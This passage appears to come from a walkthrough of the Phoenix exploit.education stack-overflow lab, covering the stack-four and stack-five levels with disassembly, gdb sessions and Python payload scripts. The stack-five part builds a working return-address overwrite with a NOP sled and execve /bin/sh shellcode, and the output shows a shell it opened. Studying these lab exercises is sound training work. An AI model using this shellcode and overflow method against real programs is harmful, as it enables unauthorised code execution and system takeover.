  400672:       89 7d fc                mov    %edi,-0x4(%rbp)
  400675:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
  400679:       bf 50 07 40 00          mov    $0x400750,%edi
  40067e:       e8 fd fd ff ff          callq  400480 <puts@plt>
  400683:       b8 00 00 00 00          mov    $0x0,%eax
  400688:       e8 a8 ff ff ff          callq  400635 <start_level>
  40068d:       b8 00 00 00 00          mov    $0x0,%eax
  400692:       c9                      leaveq 
  400693:       c3                      retq   
  400694:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40069b:       00 00 00 
  40069e:       66 90                   xchg   %ax,%ax

00000000004006a0 <__do_global_ctors_aux>:
  4006a0:       48 8b 05 c9 01 20 00    mov    0x2001c9(%rip),%rax        # 600870 <__CTOR_LIST__>
  4006a7:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  4006ab:       74 33                   je     4006e0 <__do_global_ctors_aux+0x40>
  4006ad:       55                      push   %rbp
  4006ae:       48 89 e5                mov    %rsp,%rbp
  4006b1:       53                      push   %rbx
  4006b2:       bb 70 08 60 00          mov    $0x600870,%ebx
  4006b7:       48 83 ec 08             sub    $0x8,%rsp
  4006bb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  4006c0:       48 83 eb 08             sub    $0x8,%rbx
  4006c4:       ff d0                   callq  *%rax
  4006c6:       48 8b 03                mov    (%rbx),%rax
  4006c9:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  4006cd:       75 f1                   jne    4006c0 <__do_global_ctors_aux+0x20>
  4006cf:       48 83 c4 08             add    $0x8,%rsp
  4006d3:       5b                      pop    %rbx
  4006d4:       5d                      pop    %rbp
  4006d5:       c3                      retq   
  4006d6:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4006dd:       00 00 00 
  4006e0:       f3 c3                   repz retq 

Disassembly of section .fini:

00000000004006e2 <_fini>:
  4006e2:       50                      push   %rax
  4006e3:       e8 78 fe ff ff          callq  400560 <__do_global_dtors_aux>
  4006e8:       58                      pop    %rax
  4006e9:       c3                      retq   
```
 
Objdumping the program gets us 0x40061d for the location of the complete_level function. Adding the hexcode \x1d\x06\x40 in the place where VWWWWXXX was in the input we did solves the challenge. 
 
```bash
user@phoenix-amd64:~$ python -c "print('AAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVV' + '\x1d\x06\x40')" | /opt/phoenix/amd64/stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

## Challenge 6 - Stack Five

[Stack Five Code](https://exploit.education/phoenix/stack-five/). 

This challenge is like the last challenge execpt there is no function we need to call to complete it. This requires us to make our own function to run using shell code. The buffer variable's size is now 160 bytes so we will need to input more than that in the user input. 

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSSTTTTTTTUUUUUUUUVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYZZZZZZZ"
print(padding)
```

```bash
user@phoenix-amd64:~$ python stack-five.py > /tmp/alpha
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-five 
(gdb) disas start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:     push   rbp
   0x000000000040058e <+1>:     mov    rbp,rsp
   0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:    mov    rdi,rax
   0x000000000040059c <+15>:    call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:    nop
   0x00000000004005a2 <+21>:    leave  
   0x00000000004005a3 <+22>:    ret    
End of assembler dump.
(gdb) break *0x4005a3
Breakpoint 1 at 0x4005a3
(gdb) r < /tmp/alpha 
Starting program: /opt/phoenix/amd64/stack-five < /tmp/alpha
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a3 in start_level ()
(gdb) si
0x5555555454545454 in ?? ()
(gdb) x/s $rip
0x5555555454545454:     <error: Cannot access memory at address 0x5555555454545454>
(gdb) x/64s $rsp
0x7fffffffe670: "UUUUUUVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYZZZZZZZ"
0x7fffffffe69c: ""
0x7fffffffe69d: "\177"
0x7fffffffe69f: ""
0x7fffffffe6a0: ""
0x7fffffffe6a1: ""
0x7fffffffe6a2: ""
0x7fffffffe6a3: ""
0x7fffffffe6a4: ""
0x7fffffffe6a5: ""
0x7fffffffe6a6: ""
0x7fffffffe6a7: ""
0x7fffffffe6a8: "\310\333\377\367\377\177"
0x7fffffffe6af: ""
0x7fffffffe6b0: ""
0x7fffffffe6b1: ">"
0x7fffffffe6b3: ""
0x7fffffffe6b4: "\001"
0x7fffffffe6b6: ""
0x7fffffffe6b7: "\004Y\004@"
0x7fffffffe6bc: ""
0x7fffffffe6bd: ""
0x7fffffffe6be: ""
0x7fffffffe6bf: ""
0x7fffffffe6c0: ""
0x7fffffffe6c1: ""
0x7fffffffe6c2: ""
0x7fffffffe6c3: ""
0x7fffffffe6c4: ""
0x7fffffffe6c5: ""
0x7fffffffe6c6: ""
0x7fffffffe6c7: ""
0x7fffffffe6c8: "6\004@"
0x7fffffffe6cc: ""
0x7fffffffe6cd: ""
0x7fffffffe6ce: ""
0x7fffffffe6cf: ""
0x7fffffffe6d0: "\001"
0x7fffffffe6d2: ""
0x7fffffffe6d3: ""
0x7fffffffe6d4: ""
0x7fffffffe6d5: ""
0x7fffffffe6d6: ""
0x7fffffffe6d7: ""
0x7fffffffe6d8: "\307\350\377\377\377\177"
0x7fffffffe6df: ""
0x7fffffffe6e0: ""
0x7fffffffe6e1: ""
0x7fffffffe6e2: ""
0x7fffffffe6e3: ""
0x7fffffffe6e4: ""
0x7fffffffe6e5: ""
0x7fffffffe6e6: ""
0x7fffffffe6e7: ""
0x7fffffffe6e8: "\345\350\377\377\377\177"
0x7fffffffe6ef: ""
0x7fffffffe6f0: "\241\356\377\377\377\177"
0x7fffffffe6f7: ""
0x7fffffffe6f8: "\314\356\377\377\377\177"
0x7fffffffe6ff: ""
0x7fffffffe700: "\341\356\377\377\377\177"
0x7fffffffe707: ""
0x7fffffffe708: "\353\356\377\377\377\177"
0x7fffffffe70f: ""
```

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSST"
rip = b'\x70\xe6\xff\xff\xff\x7f\x00\x00'
shell = b'\xCC'*8
print(padding+rip+shell)
```

```bash
(gdb) r < /tmp/alpha 
Starting program: /opt/phoenix/amd64/stack-five < /tmp/alpha
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a3 in start_level ()
(gdb) si
0x00007fffffffe670 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe671 in ?? ()
(gdb) quit
user@phoenix-amd64:~$ python stack-five.py | /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```
http://shell-storm.org/shellcode/files/shellcode-806.php

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSST"
rip = b'\x90\xe6\xff\xff\xff\x7f\x00\x00'
nop = b'\x90'*100
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print(padding+rip+nop+shell)
```

```bash
user@phoenix-amd64:~$ (python stack-five.py ; cat) | /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
whoami
phoenix-amd64-stack-five

```

